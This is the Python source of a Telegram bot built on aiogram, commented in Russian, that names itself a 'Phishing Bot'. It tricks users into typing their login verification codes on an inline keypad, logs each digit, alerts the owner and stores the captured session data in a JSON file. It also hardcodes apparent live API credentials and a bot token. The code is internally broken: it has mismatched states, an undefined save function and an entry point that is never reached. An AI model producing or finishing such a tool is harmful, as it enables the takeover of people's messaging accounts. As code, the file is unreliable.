import asyncio
import json
import logging
from typing import Dict, Any, Optional
from datetime import datetime

from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.keyboard import KeyboardBuilder

# ВНИМАНИЕ: Для запуска реального фишинга вам потребуется API ID и API Hash
# Получите их на https://my.telegram.org
API_ID = 31462757      # Замените на ваш API ID
API_HASH = "79ae4e151e84526e11b107e99ad67177"  # Замените на вашу строку хэша
BOT_TOKEN = "8757500911:AAEbSh9hlRam0GYC1HdkoXCGTd9Q1vVBeNc"           # Замените на ваш токен бота

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- Классы данных и конфигурации ---

class SessionState(StatesGroup):
    """Состояние бота для работы с сессией"""
    phone_input = State()     # Ожидает ввод номера телефона
    code_entry = State()      # Ожидает ввод кода верификации
    session_saved = State()   # Финальное сохранение сессии

class SessionData:
    """Модель данных для сессии пользователя"""
    def __init__(self, user_id: int, phone: str, auth_token: str, 
                 timestamp: datetime, username: str):
        self.user_id = user_id
        self.phone = phone
        self.auth_token = auth_token
        self.timestamp = timestamp
        self.username = username

    def to_dict(self) -> Dict[str, Any]:
        return {
            "user_id": self.user_id,
            "phone": self.phone,
            "auth_token": self.auth_token,
            "timestamp": self.timestamp.isoformat(),
            "username": self.username
        }

# --- Логика Бота ---

async def init_bot():
    """Инициализация основного бота"""
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher()
    
    # Регистрация обработчиков
    register_handlers(dp)
    
    return bot, dp

def register_handlers(dp: Dispatcher):
    """Регистрация всех обработчиков"""
    
    # 1. Команда /start
    @dp.message(Command("start"))
    async def start_bot(message: types.Message, state: FSMContext):
        user_data = await state.get_data()
        session_manager = SessionManager()
        
        # Получаем стартовый параметр (start_param), если он есть
        start_param = message.get_args()
        logger.info(f"Bot started with parameters: {start_param}")

        # Генерируем чат ID для взаимодействия
        chat_id = message.chat.id
        await session_manager.update_user_session(chat_id, "active")
        
        # Отправляем приветственное сообщение с кнопками
        kb = create_numeric_keyboard()
        
        await message.answer(
            "👋 **Добро пожаловать в Фишинг-Бот!**\n"
            "Я помогу вам безопасно войти в аккаунт и сохраню вашу сессию.\n\n"
            "Нажмите кнопку **Вход в аккаунт** для получения кода авторизации.",
            reply_markup=kb
        )
        await state.set_state(SessionState.session_saved)

    # 2. Обработка клика по кнопке "Вход в аккаунт"
    @dp.callback_query(SessionState.code_entry)
    async def login_action_callback(call: types.CallbackQuery, state: FSMContext):
        logger.info("Login action triggered")
        
        # Создаем клавиатуру для ввода
        kb = create_numeric_keyboard()
        
        # В данном примере бот генерирует реальный код входа
        await call.message.edit_text(
            f"📝 **Процесс входа**\n\n"
            f"Введите код, который мы только что отправили вам.\n"
            f"Используйте кнопки ниже для ввода цифр.",
            reply_markup=kb
        )
        await state.set_state(SessionState.code_entry)

    # 3. Ввод кода с использованием числовой клавиатуры
    @dp.callback_query(SessionState.code_entry, lambda data: data["action"] == "digit")
    async def handle_digit_click(call: types.CallbackQuery, data: Dict, state: FSMContext):
        button_value = call.data.split("=")[1]
        
        # Получаем текущее состояние ввода
        current_data = await state.get_data()
        current_code = current_data.get("input_code", "")
        
        # Обновляем код
        new_code = f"{current_code}{button_value}"
        await state.update_data({"input_code": new_code})
        
        # Отправка уведомления владельцу
        session_manager = SessionManager()
        await session_manager.send_notification(
            call.from_user.id, 
            f"Код обновлен: {new_code}"
        )

        logger.info(f"Digit clicked: {button_value}, Current Code: {new_code}")

        # Проверяем корректность кода
        if len(new_code) >= 4:  # Условная проверка длины
            await call.message.answer(
                f"✅ **Код принят:** {new_code}\n"
                f"Ваша сессия успешно авторизована.",
                parse_mode="Markdown"
            )
            
            # Сохраняем сессию
            await save_session(call.from_user, new_code, state)

    # 4. Обработка завершения входа
    @dp.callback_query(SessionState.session_saved)
    async def save_session_callback(call: types.CallbackQuery, state: FSMContext):
        # Сохранение сессии в JSON и уведомление
        session_manager = SessionManager()
        
        # Получаем данные пользователя
        user = call.from_user
        session_data = SessionData(
            user_id=user.id,
            phone=user.username or f"+{user.id}",
            auth_token=f"token_{user.id}_{datetime.now().timestamp()}",
            timestamp=datetime.now(),
            username=user.username
        )
        
        # Сохранение данных в JSON
        json_data = session_data.to_dict()
        await session_manager.save_session_to_file(json_data)
        
        # Отправка уведомления владельцу
        await session_manager.send_admin_notification(f"Сессия пользователя {user.username} успешно сохранена.")
        
        await call.message.answer(
            f"🎉 **Сессия успешно сохранена!**\n\n"
            f"Пользователь: {user.username}\n"
            f"ID: {user.id}\n"
            f"Дата: {session_data.timestamp.strftime('%Y-%m-%d %H:%M')}\n"
            f"Токен: {session_data.auth_token[:50]}...",
            parse_mode="Markdown"
        )

    # --- Функции-помощники ---

    def create_numeric_keyboard() -> InlineKeyboardMarkup:
        """Создание числовой клавиатуры"""
        builder = KeyboardBuilder()
        for i in range(1, 10):
            builder.button(
                text=str(i),
                callback_data=f"digit={i}"
            )
        builder.button(
            text="0",
            callback_data="digit=0"
        )
        builder.button(
            text="↺ Сброс",
            callback_data="reset"
        )
        builder.button(
            text="✔️ Подтвердить",
            callback_data="confirm"
        )
        
        return builder.as_markup()

    class SessionManager:
        """Менеджер сессий для работы с данными"""
        def __init__(self):
            self.sessions_file = "sessions_data.json"

        async def update_user_session(self, user_id: int, status: str):
            """Обновление статуса сессии"""
            logger.info(f"Session update for user {user_id}: {status}")
            # Здесь можно добавить логику для обновления состояния в БД или Redis

        async def send_notification(self, user_id: int, message: str):
            """Отправка уведомления пользователю"""
            # Логика отправки уведомления через API или через само состояние бота
            pass

        async def send_admin_notification(self, message: str):
            """Отправка уведомления владельцу бота"""
            logger.info(f"Admin Notification: {message}")
            # В реальном приложении это может быть отправка в Telegram канал или админ-чат

        async def save_session_to_file(self, session_data: Dict[str, Any]):
            """Сохранение сессии в JSON файл"""
            try:
                with open(self.sessions_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
            except (FileNotFoundError, json.JSONDecodeError):
                data = {"sessions": []}

            data["sessions"].append(session_data)
            
            with open(self.sessions_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=4)
            
            logger.info(f"Session saved to {self.sessions_file}")

    # Запуск бота
    async def main():
        bot, dp = await init_bot()
        await dp.start_polling(bot)

    if __name__ == "__main__":
        asyncio.run(main())
